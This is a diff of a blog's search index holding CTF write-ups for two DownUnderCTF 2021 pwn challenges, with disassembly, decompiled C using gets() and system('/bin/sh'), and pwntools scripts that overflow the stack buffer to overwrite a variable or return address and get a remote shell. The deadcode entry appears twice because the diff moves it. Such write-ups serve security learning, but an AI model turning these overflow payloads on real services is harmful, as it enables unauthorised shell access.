+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nt main (int argc, char **argv, char **envp);</span><br><span class="line">; var char *s @ rbp-0x20</span><br><span class="line">; var uint64_t var_8h @ rbp-0x8</span><br><span class="line">0x00401195      push    rbp</span><br><span class="line">0x00401196      mov     rbp, rsp</span><br><span class="line">0x00401199      sub     rsp, 0x20</span><br><span class="line">0x0040119d      mov     qword [var_8h], 0</span><br><span class="line">0x004011a5      mov     eax, 0</span><br><span class="line">0x004011aa      call    buffer_init ; sym.buffer_init</span><br><span class="line">0x004011af      lea     rdi, str.I_m_developing_this_new_application_in_C__I_ve_setup_some_code_for_the_new_features_but_it_s_not__a_live_yet. ; 0x402008 ; const char *s</span><br><span class="line">0x004011b6      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011bb      lea     rdi, str.What_features_would_you_like_to_see_in_my_app ; 0x402078 ; const char *s</span><br><span class="line">0x004011c2      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011c7      lea     rax, [s]</span><br><span class="line">0x004011cb      mov     rdi, rax   ; char *s</span><br><span class="line">0x004011ce      mov     eax, 0</span><br><span class="line">0x004011d3      call    gets       ; sym.imp.gets ; char *gets(char *s)</span><br><span class="line">0x004011d8      mov     eax, 0xdeadc0de</span><br><span class="line">0x004011dd      cmp     qword [var_8h], rax</span><br><span class="line">0x004011e1      jne     0x401200</span><br><span class="line">0x004011e3      lea     rdi, str.Maybe_this_code_isn_t_so_dead... ; 0x4020a8 ; const char *s</span><br><span class="line">0x004011ea      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011ef      lea     rdi, str.bin_sh ; 0x4020cb ; const char *string</span><br><span class="line">0x004011f6      mov     eax, 0</span><br><span class="line">0x004011fb      call    system     ; sym.imp.system ; int system(const char *string)</span><br><span class="line">0x00401200      mov     eax, 0</span><br><span class="line">0x00401205      leave</span><br><span class="line">0x00401206      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">undefined8 main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *s;</span><br><span class="line">    uint64_t var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = 0;</span><br><span class="line">    buffer_init();</span><br><span class="line">    puts(</span><br><span class="line">        &quot;\nI\&#x27;m developing this new application in C, I\&#x27;ve setup some code for the new features but it\&#x27;s not (a)live yet.&quot;</span><br><span class="line">        );</span><br><span class="line">    puts(&quot;\nWhat features would you like to see in my app?&quot;);</span><br><span class="line">    gets(&amp;s);</span><br><span class="line">    if (var_8h == 0xdeadc0de) &#123;</span><br><span class="line">        puts(&quot;\n\nMaybe this code isn\&#x27;t so dead...&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31916&#x27; deadcode</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;deadcode&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31916)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x20-0x8)+(0xdeadc0de).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>ductf</tag>
+        <tag>buffer overflow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[writeup][DownUnderCTF 2021] pwn-outbackdoor</title>
     <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-outbackdoor/</url>
     <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
@@ -2656,36 +2725,6 @@ https://www.bsfdvbsbilibili.com
 <h2 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31921&#x27; outBackdoor</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;outBackdoor&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31921)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">import os</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x10+0x8)+(0x401016).to_bytes(0x8,&quot;little&quot;)+(0x004011d7).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>DUCTF{<a href="https://www.youtube.com/watch?v=XfR9iY5y94s%7D">https://www.youtube.com/watch?v=XfR9iY5y94s}</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>writeup</tag>
-        <tag>ductf</tag>
-        <tag>buffer overflow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[writeup][DownUnderCTF 2021] pwn-deadcode</title>
-    <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/</url>
-    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>no pie enable. so we can simply overwrite.</p>
-<p>note that there are <code>gets</code> without length, which can perform <strong>buffoverflow</strong></p>
-<p><img src="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/20211009120913.png" alt="stack"></p>
-<p>since s is above var_8h, we can write random 16 bytes + 0xdeadc0de in 8 bytes to overwrite var_8h to value of 0xdeadc0de, which will lead us to the shell.</p>
-<span id="more"></span>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nt main (int argc, char **argv, char **envp);</span><br><span class="line">; var char *s @ rbp-0x20</span><br><span class="line">; var uint64_t var_8h @ rbp-0x8</span><br><span class="line">0x00401195      push    rbp</span><br><span class="line">0x00401196      mov     rbp, rsp</span><br><span class="line">0x00401199      sub     rsp, 0x20</span><br><span class="line">0x0040119d      mov     qword [var_8h], 0</span><br><span class="line">0x004011a5      mov     eax, 0</span><br><span class="line">0x004011aa      call    buffer_init ; sym.buffer_init</span><br><span class="line">0x004011af      lea     rdi, str.I_m_developing_this_new_application_in_C__I_ve_setup_some_code_for_the_new_features_but_it_s_not__a_live_yet. ; 0x402008 ; const char *s</span><br><span class="line">0x004011b6      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011bb      lea     rdi, str.What_features_would_you_like_to_see_in_my_app ; 0x402078 ; const char *s</span><br><span class="line">0x004011c2      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011c7      lea     rax, [s]</span><br><span class="line">0x004011cb      mov     rdi, rax   ; char *s</span><br><span class="line">0x004011ce      mov     eax, 0</span><br><span class="line">0x004011d3      call    gets       ; sym.imp.gets ; char *gets(char *s)</span><br><span class="line">0x004011d8      mov     eax, 0xdeadc0de</span><br><span class="line">0x004011dd      cmp     qword [var_8h], rax</span><br><span class="line">0x004011e1      jne     0x401200</span><br><span class="line">0x004011e3      lea     rdi, str.Maybe_this_code_isn_t_so_dead... ; 0x4020a8 ; const char *s</span><br><span class="line">0x004011ea      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011ef      lea     rdi, str.bin_sh ; 0x4020cb ; const char *string</span><br><span class="line">0x004011f6      mov     eax, 0</span><br><span class="line">0x004011fb      call    system     ; sym.imp.system ; int system(const char *string)</span><br><span class="line">0x00401200      mov     eax, 0</span><br><span class="line">0x00401205      leave</span><br><span class="line">0x00401206      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">undefined8 main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *s;</span><br><span class="line">    uint64_t var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = 0;</span><br><span class="line">    buffer_init();</span><br><span class="line">    puts(</span><br><span class="line">        &quot;\nI\&#x27;m developing this new application in C, I\&#x27;ve setup some code for the new features but it\&#x27;s not (a)live yet.&quot;</span><br><span class="line">        );</span><br><span class="line">    puts(&quot;\nWhat features would you like to see in my app?&quot;);</span><br><span class="line">    gets(&amp;s);</span><br><span class="line">    if (var_8h == 0xdeadc0de) &#123;</span><br><span class="line">        puts(&quot;\n\nMaybe this code isn\&#x27;t so dead...&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31916&#x27; deadcode</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;deadcode&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31916)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x20-0x8)+(0xdeadc0de).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</p>
 ]]></content>
       <categories>
         <category>CTF</category>
